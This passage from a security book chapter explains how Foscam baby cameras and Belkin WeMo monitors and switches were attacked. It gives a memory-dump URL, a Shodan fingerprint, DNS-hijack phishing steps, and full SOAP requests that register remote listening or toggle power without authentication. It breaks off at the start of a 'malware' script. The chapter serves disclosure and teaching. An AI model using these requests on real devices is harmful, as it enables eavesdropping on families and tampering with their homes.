Foscam Vulnerabilities Exposed by Researchers
A few weeks after the Gilbert incident, security researchers realized that the device in
question was manufactured by the company Foscam, against which security researchers
had exposed vulnerabilities at the Hack in the Box conference just months earlier.
Figure 3-1 shows one of the vulnerable Foscam devices in question.
The Foscam Incident 
| 
73

Figure 3-1. Foscam baby monitor
According to the researchers, once an attacker knows the IP address of the baby monitor,
he or she can simply browse to the following URL to download the entire memory of
the device:
http://[IP Address]/proc/kcore
Once the attacker has access to the kcore file, he or she can simply open it in a hex editor
to obtain the username and password. Armed with these credentials, the attacker can
control the camera. It is quite probable that the intruder in question abused this vul‐
nerability.
Using Shodan to Find Baby Monitors Exposed on the Internet
The question at hand is how a potential intruder can locate a specific baby monitor that
is exposed on the Internet? After all, there are probably billions of devices on the Internet
and growing. The search engine Shodan can be used to easily locate all sorts of devices
connected to the Internet. Shown in Figure 3-2, Shodan lets you find routers, servers,
and all sorts of devices connected to the Internet using a variety of filters. Shodan con‐
74 
| 
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing

tinuously locates and queries devices all over the Internet to index the services running
on them.
Figure 3-2. The Shodan search engine
According to research published in a paper titled Exploiting Foscam IP Cameras, the
web server running on Foscam devices return the value Netwave IP Camera (later ver‐
sions of Foscam devices and firmware have the value Boa/0.94.13) in the Server field
as part of the HTTP response. Using this information, it is easy to query Shodan to find
the IP address of Foscam devices, as shown in Figure 3-3.
The Foscam Incident 
| 
75

Figure 3-3. Shodan query to locate Foscam devices on the Internet
As you can see from the Shodan query in Figure 3-3, about 700,000 IP addresses were
instantly found to respond to our query. This demonstrates how easy it is for a potential
attacker to locate vulnerable devices such as the Foscam monitor and exploit known
vulnerabilities.
Exploiting Default Credentials
Foscam devices were known to be assigned the default username of “admin” and a blank
password, which most users are likely to leave as is (unless the setup process demands
the selection of a stronger password, which wasn’t the case in the vulnerable version of
Foscam devices). A simple Shodan query illustrates the sheer magnitude of the number
of individuals and organizations who are unaware that their privacy can be so easily
violated.
In August 2013, Foscam released an upgrade that prompted users to change the default
blank password and gave them the ability to choose a username other than “admin”.
However, as shown in Figure 3-4, users have to manually locate the software update and
76 
| 
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing

then apply it using the web interface. It is easy to imagine that most owners of Foscam
weren’t aware of the availability of the security update.
Figure 3-4. Foscam releases a firmware update that requires manual processes
In the age where users are accustomed to mobile and desktop devices that implement
auto-update features, it is also easy to imagine that people who were made aware of the
update were unlikely to apply it, given the traditional process of downloading a file to
The Foscam Incident 
| 
77

manually upgrade their device. This was confirmed in the previously referenced “Ex‐
ploiting Foscam IP Cameras” research paper, in which the researchers concluded, “We
found exactly zero cameras in the wild which run the latest firmware offered by Foscam.
This could indicate end users who know to patch also know better than to hook up an
IP camera to the Internet, or it could indicate that no one patches their cameras.”
Exploiting Dynamic DNS
In addition to the issues around weak credentials, the “Exploiting Foscam IP Cameras”
whitepaper also calls out a vulnerability in the Foscam devices relating to the included
Dynamic DNS feature. Every Foscam device includes a unique six-character hostname
(in the form of xx####, where x is a letter and \# is a digit) that is printed on a label and
fixed to the camera. This static value is also flashed into the device’s memory and is used
as both the username and password for the Dynamic DNS feature.
This feature essentially allows every camera to update its IP address to point to a host‐
name of xx####.myfoscam.org (valid combination of hostnames were found to be be‐
tween aa0000 and ep9310). This allows the user to log into their camera using a web
browser on a device outside of their home without having to remember their numeric
IP address. All the user has to do is remember the hostname associated with the myfo
scam.org Dynamic DNS service.
The Foscam devices use the User Datagram Protocol (UDP) to update their hostname
mapping by sending a UDP packet to a server owned by Foscam. The UDP packet
contains the username and password associated with the device, which is essentially the
hostname, whose ranges are known to be between aa0000 and ep9310. The “Exploiting
Foscam IP Cameras” paper illustrates how an attacker can be abuse this knowledge to
invoke phishing attacks:
1. The attacker queries ns1.myfoscam.org to get and store the current IP address of
a particular device within the range of aa0000 and ep9310. For the sake of our
argument, assume the target is aa0000.
2. The attacker sends a UDP datagram to Foscam with username and password of
aa0000.
3. The Foscam service updates its Dynamic DNS records to point aa0000 to the source
IP address of the attacker.
4. The attacker runs a web server on his or her IP address that looks indentical to that
of the Foscam interface.
5. The attacker waits for the owner of the device to browse to aa0000.myfo
scam.org, which will now connect to the attacker’s web interface rather than the
interface for the actual device owned by the victim.
6. The victim will supply his or her credentials, which the attacker captures.
78 
| 
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing

7. The attacker will then display a “Invalid username or password” message, causing
the victim to assume they mistyped the credentials.
8. At this point, the attacker can send a spoofed UDP datagram to the Foscam Dynamic
DNS service with the original IP address of the attacker (captured in step 1). Now,
when the victim visits aa0000.myfoscam.org again, he or she will be directed to his
or her actual Foscam device instead of the attacker’s web server. In this way, the
attacker will retain the victim’s credential and the victim will have little reason to
suspect his or her credentials have been compromised. The attacker can now con‐
nect to the victim’s device directly and reuse the captured credentials to login and
control the device.
In the case of Mark Gilbert, it is unclear exactly what method the attackers may have
used. However, it is a reasonable hypothesis to expect that the attacker leveraged a com‐
bination of the attack techniques and vulnerabilities discussed so far.
The Foscam Saga Continues
The Gilbert incident occurred in August 2013. In April 2014, another such incident
occurred in the home of Heather Schreck. Around midnight, Heather was startled by a
man’s voice in her daughter Emma’s bedroom. Heather noticed the baby monitor camera
move and heard the voice, saying “Wake up, baby, wake up, baby,” emit from the device.
Heather’s husband Adam ran into Emma’s room, saw the camera turn toward him, and
heard obscenities targeted at him. Adam then unplugged the camera. Yes, this was also
a Foscam camera.
This is yet another example of how vulnerabilities in IoT devices such as baby monitors
can persist, specially if the device manufacturer does not implement a seamless method
to push security patches to devices. As discussed earlier, the manual labor required to
update Foscam devices pretty much guarantees most people are unlikely to take the
effort to find and apply security patches. Given the hundreds of thousands of Foscam
devices that can be found with a simple Shodan query, incidents such as those targeting
the Gilbert and Schreck families are likely to reoccur.
In January 2014, just a little before the Schreck incident, a user publicly posted a severe
authentication bypass vulnerability on Foscam’s public discussion forum (shown in
Figure 3-5).
The Foscam Incident 
| 
79

Figure 3-5. Authentication bypass vulnerability posted on Foscam’s discussion forum
According to the forum post, it is possible to completely bypass authentication by using
both the username and password fields blank. In response, Foscam released a patch that
resolved the issue, but the manual steps outlined to apply the patch were the same as
those shown in Figure 3-4. Yet again, such a cumbersome and manual process makes it
extremely unlikely that Foscam devices accessible on the Internet have this patch ap‐
plied.
It is unknown exactly which one of the Foscam attacks were exploited in the Gilbert
and Schreck incidents, but this authentication bypass issue is one of the easiest to abuse,
so it is quite likely that it has been leveraged to invade the privacy of Foscam users, given
the number of devices that can be queried using Shodan.
80 
| 
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing

The Belkin WeMo Baby Monitor
The WeMo baby monitor (Figure 3-6) can be accessed using a companion iOS app.
Unlike radio-based monitors, the user of the iOS app can tune from anywhere in the
world with access to the Internet. IoT products by Belkin have been particularly popular,
so our emphasis on this product is warranted. In this section, we will take a look at how
the device authenticates connections, to understand what security mechanisms are built
in.
Figure 3-6. The Belkin WeMo baby monitor
In order to connect an iOS device to the WeMo, the user must first download the WeMo
Baby app and launch it as illustrated in Figure 3-7.
The Belkin WeMo Baby Monitor 
| 
81

Figure 3-7. The WeMo Baby iOS app
The WeMo baby monitor has been discontinued by the manufactur‐
er and is no longer availalble for sale. However, the design and archi‐
tecure of the product is different than the Foscam devices we have
been discussing thus far. As such, it is a good candidate for us to study
to uncover security issues.
82 
| 
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing

Once the user launches the iOS app while on the local WiFi network, the app attempts
to locate the baby monitor using the Simple Service Discovery Protocol (SSDP), which
is the discovery component of the Universal Plug and Play protocol. In order to find
the baby monitor, the iOS app sends the following UDP packet destined to the multi‐
cast address of 239.255.255.250 (common multicast address to detect devices such as
the WeMo monitor) on port 1900:
M-SEARCH * HTTP/1.1
ST: upnp:rootdevice
MX: 3
MAN: "ssdp:discover"
HOST: 239.255.255.250:1900
Since this is a multicast packet, it is broadcasted to the local network. However, only
devices (such as the WeMo monitor) that are actively listening for SSDP packets process
the discovery request. In this case, the WeMo monitor responds with the following UDP
packet to the iOS app:
HTTP/1.1 200 OK
CACHE-CONTROL: max-age=86400
EXT:
LOCATION: http://10.0.1.2:49153/setup.xml
OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01
SERVER: Linux/2.6.21, UPnP/1.0, Portable SDK for UPnP devices/1.6.18
X-User-Agent: redsonic
ST: upnp:rootdevice
USN: uuid:wemo_baby-1_0-[serialNumber DELETED]::upnp:rootdevice
Based on the response, the iOS app captures the IP address of the baby monitor
(10.0.1.2) and the destination port (49153), along with the target resource to request
to set up initial access (i.e., /setup.xml). Note that the response from the monitor also
includes the value for the serialNumber that is printed on the bottom of the physical
WeMo device.
The iOS app then submits the following GET request to the baby monitor (at IP address
10.0.1.2 and TCP port 49153):
GET /setup.xml HTTP/1.1
Content-Length: 0
HOST: 10.0.1.2:49153
User-Agent: CyberGarage-HTTP/1.0
To which the WeMo monitor responds:
<root xmlns="urn:Belkin:device-1-0">
  <specVersion>
    <major>1</major>
    <minor>0</minor>
  </specVersion>
  <device>
<deviceType>urn:Belkin:device:wemo_baby:1</deviceType>
The Belkin WeMo Baby Monitor 
| 
83

<friendlyName>WeMo Baby</friendlyName>
    <manufacturer>Belkin International Inc.</manufacturer>
    <manufacturerURL>http://www.belkin.com</manufacturerURL>
    <modelDescription>Belkin Plugin Socket 1.0</modelDescription>
    <modelName>Socket</modelName>
    <modelNumber>1.0</modelNumber>
    <modelURL>http://www.belkin.com/plugin/</modelURL>
<serialNumber>[DELETED]</serialNumber>
<UDN>uuid:wemo_baby-1_0</UDN>
    <UPC>123456789</UPC>
<macAddress>[DELETED]</macAddress>
<firmwareVersion>WeMo_WW_2.00.2397.PVT_Baby</firmwareVersion>
<iconVersion>0|49153</iconVersion>
<binaryState>0</binaryState>
    <iconList>
      <icon>
        <mimetype>jpg</mimetype>
        <width>100</width>
        <height>100</height>
        <depth>100</depth>
         <url>icon.jpg</url>
      </icon>
    </iconList>
    <serviceList>
      <service>
        <serviceType>urn:Belkin:service:WiFiSetup:1</serviceType>
        <serviceId>urn:Belkin:serviceId:WiFiSetup1</serviceId>
        <controlURL>/upnp/control/WiFiSetup1</controlURL>
        <eventSubURL>/upnp/event/WiFiSetup1</eventSubURL>
        <SCPDURL>/setupservice.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:timesync:1</serviceType>
        <serviceId>urn:Belkin:serviceId:timesync1</serviceId>
        <controlURL>/upnp/control/timesync1</controlURL>
        <eventSubURL>/upnp/event/timesync1</eventSubURL>
        <SCPDURL>/timesyncservice.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:basicevent:1</serviceType>
        <serviceId>urn:Belkin:serviceId:basicevent1</serviceId>
        <controlURL>/upnp/control/basicevent1</controlURL>
        <eventSubURL>/upnp/event/basicevent1</eventSubURL>
        <SCPDURL>/eventservice.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:firmwareupdate:1</serviceType>
        <serviceId>urn:Belkin:serviceId:firmwareupdate1</serviceId>
        <controlURL>/upnp/control/firmwareupdate1</controlURL>
        <eventSubURL>/upnp/event/firmwareupdate1</eventSubURL>
        <SCPDURL>/firmwareupdate.xml</SCPDURL>
      </service>
84 
| 
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing

      <service>
        <serviceType>urn:Belkin:service:rules:1</serviceType>
        <serviceId>urn:Belkin:serviceId:rules1</serviceId>
        <controlURL>/upnp/control/rules1</controlURL>
        <eventSubURL>/upnp/event/rules1</eventSubURL>
        <SCPDURL>/rulesservice.xml</SCPDURL>
      </service>
.
      <service>
        <serviceType>urn:Belkin:service:metainfo:1</serviceType>
        <serviceId>urn:Belkin:serviceId:metainfo1</serviceId>
        <controlURL>/upnp/control/metainfo1</controlURL>
        <eventSubURL>/upnp/event/metainfo1</eventSubURL>
        <SCPDURL>/metainfoservice.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:remoteaccess:1</serviceType>
        <serviceId>urn:Belkin:serviceId:remoteaccess1</serviceId>
        <controlURL>/upnp/control/remoteaccess1</controlURL>
        <eventSubURL>/upnp/event/remoteaccess1</eventSubURL>
        <SCPDURL>/remoteaccess.xml</SCPDURL>
      </service>
.
    </serviceList>
   <presentationURL>/pluginpres.html</presentationURL>
</device>
</root>
Note that the WeMo device returns the value for the serialNumber again, which is the
same as in the response to the SSDP query. The response also includes various additional
services, the most interesting of which is /upnp/control/remoteaccess1 service. The
iOS app sends the following POST request to this service to obtain authorization to
connect to the WeMo and listen into the audio:
POST /upnp/control/remoteaccess1 HTTP/1.1
Content-Type: text/xml; charset="utf-8"
SOAPACTION: "urn:Belkin:service:remoteaccess:1#RemoteAccess"
Content-Length: 589
HOST: 10.0.1.2:49153
User-Agent: CyberGarage-HTTP/1.0
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
 <s:Body>
  <u:RemoteAccess xmlns:u="urn:Belkin:service:remoteaccess:1">
   <DeviceId>[DELETED]</DeviceId>
   <dst>0</dst>
   <HomeId></HomeId>
   <DeviceName>iPad 4G</DeviceName>
The Belkin WeMo Baby Monitor 
| 
85

   <MacAddr></MacAddr>
   <smartUniqueId></smartUniqueId>
   <numSmartDev></numSmartDev>
  </u:RemoteAccess>
 </s:Body>
</s:Envelope>
Notice the DeviceId field, which is a random token created by the iOS App. Here is the
response from the WeMo device:
HTTP/1.1 200 OK
CONTENT-LENGTH: 631
CONTENT-TYPE: text/xml; charset="utf-8"
EXT:
SERVER: Linux/2.6.21, UPnP/1.0, Portable SDK for UPnP devices/1.6.18
X-User-Agent: redsonic
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>
<u:RemoteAccessResponse xmlns:u="urn:Belkin:service:remoteaccess:1">
<homeId>610337</homeId>
<resultCode>PLGN_200</resultCode>
<description>Successful</description>
<statusCode>S</statusCode>
<smartUniqueId>[DELETED]</smartUniqueId>
<numSmartDev>3</numSmartDev>
</u:RemoteAccessResponse>
</s:Body> </s:Envelope>
The DeviceId token issued by the iOS app is now authorized. Note that the value of the
smartUniqueId field returned by WeMo is the same value of DeviceId issued by the
iOS app in the initial request. This value, along with the serialNumber value obtained
earlier, are the only two tokens required to connect to the baby monitor from the In‐
ternet and listen in.
The iOS app and the WeMo device use the Session Initiation Protocol (SIP) to connect
to each other, allowing the iOS app to listen in to the audio. This makes sense, given
that SIP is a common protocol used to make audio calls over the Internet. To make the
connection, the iOS app invokes the INVITE action to initiate the call:
SIP/2.0 100 Trying
Via: SIP/2.0/TCP 10.0.0.2:59662;rport=4096;received=10.0.0.115;
Record-Route: <sip:k2.k.belkin.evodevices.com:6060;transport=tcp;lr;
did=f9e.f801;nat=yes>
From: <sip:[DELETED but same as smartUniqueId and DeviceID]@
bedev.evomonitors.com>;
To: <sip:[DELETED but same as serialNumber]@bedev.evomonitors.com>
CSeq: 5874 INVITE
Content-Length:  0
86 
| 
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing

Note that the IP address the iOS app connects to is k2.k.belkin.evodevices.com,
which is accessible from the Internet. This means that the iOS app user can be anywhere
in the world with access to the Internet, as long as k2.k.belkin.evodevices.com is
reachable (the user needs only one-time access to same local network as the the WeMo
monitor to directly connect to the device and obtain authorization using the /upnp/
control/remoteaccess1 service described earlier). Furthermore, the iOS app needs
only the serialNumber and the smartUniqueID value (same as the DeviceId value). In
this case, the SIP server on k2.k.belkin.evodevices.com responds with the following:
SIP/2.0 200 OK
Via: SIP/2.0/TCP 10.0.0.2:59662;rport=4096;received=10.0.0.115;
Record-Route: <sip:k2.k.belkin.evodevices.com:6060;transport=tcp;lr;
did=f9e.f801;nat=yes>
From: <sip: [DELETED but same as smartUniqueId and DeviceID]@
bedev.evomonitors.com>;
To: <sip:[DELETED but same as serialNumber]@bedev.evomonitors.com>;
CSeq: 5874 INVITE
Contact: <sip: [DELETED but same as serialNumber]@10.0.0.115:3925;
transport=tcp;ob>;+sip.ice
Allow: PRACK, INVITE, ACK, BYE, CANCEL, UPDATE, SUBSCRIBE, NOTIFY, REFER,
MESSAGE, OPTIONS
Supported: replaces, 100rel, timer, norefersub
Session-Expires: 91;refresher=uac
Content-Type: application/sdp
Content-Length:   368
v=0
o=- 3589015852 3589015853 IN IP4 10.0.1.2
s=pjmedia
c=IN IP4 10.0.1.2
b=AS:84
t=0 0
a=X-nat:0
m=audio 3106 RTP/AVP 3 96
c=IN IP4 10.0.1.2
b=TIAS:64000
b=RS:0
b=RR:0
a=sendrecv
a=rtpmap:3 GSM/8000
a=rtpmap:96 telephone-event/8000
a=fmtp:96 0-15
a=candidate:Ha000102 1 UDP 2130706431 10.0.1.2 3106 typ host
At this point, the connection is now established and the iOS app is able to listen to the
audio transmitted by the WeMo baby monitor.
The Belkin WeMo Baby Monitor 
| 
87

Bad Security by Design
As we’ve seen, the iOS app needs only one-time access to the same local network as the
baby monitor to invoke the /upnp/control/remoteaccess1 service. Once this is done,
the iOS app can listen in to the baby monitor from anywhere in the world by contacting
the k2.k.belkin.evodevices.com server using SIP. The obvious issue here is that a user
with one-time access to the local WiFi network can register themselves without au‐
thentication and authorization. They can also continue to access the baby monitor re‐
motely until a local user specifically deletes the device from the Access list (using the
iOS app while on the local WiFi). See this YouTube video for a demonstration of this in
action.
A realistic situation in which this vulnerability could become a problem would be a
visitor to someone’s home requesting temporary access to a personal WiFi network. If
this individual were to access the WeMo Baby app, he or she could then continue to
listen in to the baby monitor remotely. On this note, Lon J. Seidman’s Amazon review
of the WeMo baby monitor specifically states his concern over this design issue:
…But that’s not the only issue plaguing this device. The other is a very poor security
model that leaves the WeMo open to unwelcome monitoring. The WeMo allows any iOS
device on your network to connect to it and listen in without a password. If that’s not bad
enough, when an iPhone has connected once on the local network it can later tune into
the monitor from anywhere in the world. Belkin assumes that your access point is secured
and that the only people accessing it are people you know. This is especially troublesome
for people who don’t secure their access points or are using weak security that’s vulnerable
to cracking._
Belkin seems to acknowledge this vulnerability in the software, showing which devices
can connect to the WeMo and whether or not to allow global snooping. Unfortunately
WeMo gives full access to every device right out of the gate, requiring you to continually
monitor it to ensure that an unauthorized listener hasn’t connected to it.
The bottom line? It’s not reliable enough to make it an effective monitor for my child,
nor is it secure enough to give me the confidence that others can’t snoop in. For those
reasons I simply can’t recommend this product.
In response to Seidman’s review, Belkin issued this comment:
Hello Lon,
Thanks for taking the time to review the WeMo Audio Baby monitor. We appreciate your
security concerns and would like to respond to the issues you raise. For homes that use
a password for their WiFi, our product is as secure as any item on that network. For
someone to get access to the baby monitor a person would need to discover that password.
For homes without a password we recommend they implement one for the general se‐
curity of everything they do on their home network. We are adding this recommendation
to our Frequently Asked Questions.
As you correctly identified, families are able to give access to others by sharing their WiFi
password with trusted friends or family members. We believe this is a positive feature of
88 
| 
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing

the system and expect people will treat the sharing of this password with care as it gives
access to their home network. However for those who are concerned, when logged onto
the baby monitor, it’s possible to disable the remote access of others if uncomfortable
with having others listening.
If you have any other feedback you would like to share with us we are always happy to
hear it. Please write us at customercare@belkin.com.
Best Regards, Belkin Support
As we add additional IoT devices to our homes, the reliance on WiFi security becomes
a hard sell. Given the impact to our physical privacy and safety, it’s difficult to stand by
the argument that all bets are off once a single device (computer or IoT device) is com‐
promised. Homes in developed countries are bound to have dozens of remotely con‐
trollable IoT devices. The single point of failure can’t be the WiFi password. What’s more,
a compromised computer or device will already have access to the network, so a remote
attacker does not need the WiFi password. This point takes us to the issue of malware,
which is discussed in the next section.
Malware Gone Wild
It is not uncommon for workstations and laptops in homes to become infected with
malware at some point. Given the prevalence of malware, operating systems are in‐
creasingly starting to be designed with firewalls turned on by default. The intention
behind this notion is that devices on the same local network should not inherently trust
that every other device is also secure.
Now consider the case of the WeMo baby monitor. Should any device on the local WiFi
network be compromised, malware can easily obtain authorization on behalf of the
malware author by following these simple steps:
1. Locate the WeMo baby monitor on the local network using SSDP.
2. Issue GET request to /setup.xml to obtain the serialNumber.
3. Issue POST request to /upnp/control/remoteaccess1 with self-chosen DeviceID.
4. Transmit the serialNumber and DeviceID to the malware author. As shown in the
SIP requests discussed previously, this is the secret information needed to initiate
a connection to the baby monitor and listen in.
We can expect malware authors to incorporate scanning of the local network for baby
monitors. Once a device is located, such a scenario is easy to implement, given that all
local devices can authorize themselves for remote access to the WeMo baby monitor. If
the malware author is able to successfully compromise multiple workstations and lap‐
tops, he or she will have access to every WeMo baby monitor that is in the same home
as that of the infected device.
The Belkin WeMo Baby Monitor 
| 
89

Some Things Never Change: The WeMo Switch
In many corporations, secure design is either well established or a mere afterthought
across their product lines. Usually, the culture of an organization is influenced by ac‐
knowledging the importance of security by the executive leadership, who are ultimately
answerable to the board and to the shareholders. One clear example of this is the famous
memo sent by Bill Gates to all Microsoft employees in 2002, in which he writes:
In the past, we’ve made our software and services more compelling for users by adding
new features and functionality, and by making our platform richly extensible. We’ve done
a terrific job at that, but all those great features won’t matter unless customers trust our
software. So now, when we face a choice between adding features and resolving security
issues, we need to choose security. Our products should emphasize security right out of
the box, and we must constantly refine and improve that security as threats evolve.
Gates’s memo came at a time when known vulnerabilities in Microsoft’s software were
being exploited by attackers all over the world. One prime example of this is the Nimda
worm, which was released in 2001 and became the most widespread Internet worm.
This worm was able to exploit multiple operating systems designed by Microsoft: Win‐
dows 95, 98, ME, NT, and 2000.
Ten years later, Microsoft executive Craig Mundie released a statement to all Microsoft
employees reflecting on the Gates memo and the progress Microsoft has made:
Our internal and external work over the past ten years has unquestionably raised the bar
in software quality, and demonstrated our commitment to building trustworthy products.
In security, we are now widely recognized as a leader in secure development due to our
rigorous implementation of the Security Development Lifecycle and our willingness to
make it available to others. In privacy, we were the first company to publish privacy
standards for developers and to provide consumers with layered privacy notices. In re‐
liability, better instrumentation such as Windows error reporting enabled us to address
system crashes, increasing productivity and alleviating user frustration.
Since we have studied the Belkin WeMo baby monitor in detail, let us look at another
product (the WeMo switch), also designed by Belkin, to see if similar security issues
exist across their product line. This will give us additional perspective to understand
whether the issue of insecure design permeates across organizations within the com‐
pany. Many of the existing and upcoming IoT corporations will have to maintain con‐
sistency with security across their products, so it is important to continuously analyze
the security of multiple products produced by the same organization.
The Belkin WiFi-enabled WeMo Switch (shown in Figure 3-8) lets you turn electronic
devices on or off from anywhere. The WeMo Switch uses the home WiFi network to
provide wireless control of lamps, fans, heaters, and any electric device that is plugged
into it. All you have to do is download the free WeMo app from the Google Play Store
or the Apple App Store, plug the switch into an outlet in your home, and plug any device
90 
| 
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing

into the switch. Once this is done, you can use the WeMo App to turn the device on or
off from anywhere.
Figure 3-8. The Belkin WeMo Switch
The WeMo app (Figure 3-9) is quite simple. All you have to do is launch the app and
click on the power button associated with the switch to toggle the power on or off. This
will cause the device connected to the switch to turn on or off.
Some Things Never Change: The WeMo Switch 
| 
91

Figure 3-9. The WeMo Switch app
92 
| 
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing

To locate the Switch, the app broadcasts the following SSDP request:
M-SEARCH * HTTP/1.1
HOST:239.255.255.250:1900
ST:upnp:rootdevice
MX:2
MAN:"ssdp:discover"
The Switch then responds with the following payload:
HTTP/1.1 200 OK
CACHE-CONTROL: max-age=86400
DATE: Mon, 14 Oct 2013 10:48:31 GMT
LOCATION: http://10.0.1.8:49153/setup.xml
OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01
SERVER: Unspecified, UPnP/1.0, Unspecified
X-User-Agent: redsonic
ST: upnp:rootdevice
USN: uuid:Socket-1_0::upnp:rootdevice
This is exactly how the WeMo Baby app located the baby monitor. From our earlier
discussion, the next course of action is for the app to obtain the contents of set
up.xml from the web server running on the switch. Here are the contents of setup.xml:
<?xml version="1.0"?>
<root xmlns="urn:Belkin:device-1-0">
  <specVersion>
    <major>1</major>
    <minor>0</minor>
  </specVersion>
  <device>
<deviceType>urn:Belkin:device:controllee:1</deviceType>
<friendlyName>WeMo Switch</friendlyName>
    <manufacturer>Belkin International Inc.</manufacturer>
    <manufacturerURL>http://www.belkin.com</manufacturerURL>
    <modelDescription>Belkin Plugin Socket 1.0</modelDescription>
    <modelName>Socket</modelName>
    <modelNumber>1.0</modelNumber>
    <modelURL>http://www.belkin.com/plugin/</modelURL>
<serialNumber>[DELETED]</serialNumber>
    <UPC>123456789</UPC>
<macAddress>[DELETED]</macAddress>
<firmwareVersion>WeMo_US_2.00.2769.PVT</firmwareVersion>
<iconVersion>0|49153</iconVersion>
<binaryState>0</binaryState>
    <iconList>
      <icon>
        <mimetype>jpg</mimetype>
        <width>100</width>
        <height>100</height>
        <depth>100</depth>
         <url>icon.jpg</url>
      </icon>
Some Things Never Change: The WeMo Switch 
| 
93

    </iconList>
    <serviceList>
      <service>
        <serviceType>urn:Belkin:service:WiFiSetup:1</serviceType>
        <serviceId>urn:Belkin:serviceId:WiFiSetup1</serviceId>
        <controlURL>/upnp/control/WiFiSetup1</controlURL>
        <eventSubURL>/upnp/event/WiFiSetup1</eventSubURL>
        <SCPDURL>/setupservice.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:timesync:1</serviceType>
        <serviceId>urn:Belkin:serviceId:timesync1</serviceId>
        <controlURL>/upnp/control/timesync1</controlURL>
        <eventSubURL>/upnp/event/timesync1</eventSubURL>
        <SCPDURL>/timesyncservice.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:basicevent:1</serviceType>
        <serviceId>urn:Belkin:serviceId:basicevent1</serviceId>
        <controlURL>/upnp/control/basicevent1</controlURL>
        <eventSubURL>/upnp/event/basicevent1</eventSubURL>
        <SCPDURL>/eventservice.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:firmwareupdate:1</serviceType>
        <serviceId>urn:Belkin:serviceId:firmwareupdate1</serviceId>
        <controlURL>/upnp/control/firmwareupdate1</controlURL>
        <eventSubURL>/upnp/event/firmwareupdate1</eventSubURL>
        <SCPDURL>/firmwareupdate.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:rules:1</serviceType>
        <serviceId>urn:Belkin:serviceId:rules1</serviceId>
        <controlURL>/upnp/control/rules1</controlURL>
        <eventSubURL>/upnp/event/rules1</eventSubURL>
        <SCPDURL>/rulesservice.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:metainfo:1</serviceType>
        <serviceId>urn:Belkin:serviceId:metainfo1</serviceId>
        <controlURL>/upnp/control/metainfo1</controlURL>
        <eventSubURL>/upnp/event/metainfo1</eventSubURL>
        <SCPDURL>/metainfoservice.xml</SCPDURL>
      </service>
      <service>
        <serviceType>urn:Belkin:service:remoteaccess:1</serviceType>
        <serviceId>urn:Belkin:serviceId:remoteaccess1</serviceId>
        <controlURL>/upnp/control/remoteaccess1</controlURL>
        <eventSubURL>/upnp/event/remoteaccess1</eventSubURL>
        <SCPDURL>/remoteaccess.xml</SCPDURL>
94 
| 
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing

      </service>
      <service>
        <serviceType>urn:Belkin:service:deviceinfo:1</serviceType>
        <serviceId>urn:Belkin:serviceId:deviceinfo1</serviceId>
        <controlURL>/upnp/control/deviceinfo1</controlURL>
        <eventSubURL>/upnp/event/deviceinfo1</eventSubURL>
        <SCPDURL>/deviceinfoservice.xml</SCPDURL>
      </service>
    </serviceList>
   <presentationURL>/pluginpres.html</presentationURL>
</device>
</root>
Notice the remoteaccess1 service. It is invoked similarly to the example listed for WeMo
Baby. However, we notice an extra service here called basicevent1. It turns out that if
the user is on the same WiFi network as the Switch, it is possible to connect to this
service and issue a command to toggle the Switch:
POST /upnp/control/basicevent1 HTTP/1.1
SOAPACTION: "urn:Belkin:service:basicevent:1#SetBinaryState"
Content-Length: 316
Content-Type: text/xml; charset="utf-8"
HOST: 10.0.1.8:49153
User-Agent: CyberGarage-HTTP/1.0
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
 <s:Body>
  <u:SetBinaryState xmlns:u="urn:Belkin:service:basicevent:1">
   <BinaryState>0</BinaryState>
  </u:SetBinaryState>
 </s:Body>
</s:Envelope>
The BinaryState value is set to 0, which commands the Switch to toggle to the off
position. The Switch responds:
HTTP/1.1 200 OK
CONTENT-LENGTH: 285
CONTENT-TYPE: text/xml; charset="utf-8"
DATE: Mon, 14 Oct 2013 10:58:26 GMT
EXT:
SERVER: Unspecified, UPnP/1.0, Unspecified
X-User-Agent: redsonic
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>
<u:SetBinaryStateResponse xmlns:u="urn:Belkin:service:basicevent:1">
<BinaryState>0</BinaryState>
Some Things Never Change: The WeMo Switch 
| 
95

</u:SetBinaryStateResponse>
</s:Body> </s:Envelope>
The HTTP OK response, along with the confirmation of the BinaryState value of 0,
indicates that the Switch as able to successfully turn off power to the connected appli‐
ance.
Isaac Kelly has created a proof-of-concept toolkit in Python to test local access to the
WeMo Switch. For demonstration purposes, a simple malware script with local access
can wrap use this framework to perpetually turn the electronic device (plugged into the
WeMo switch) off:
#!/usr/bin/python
import time
from wemo import on, off, get
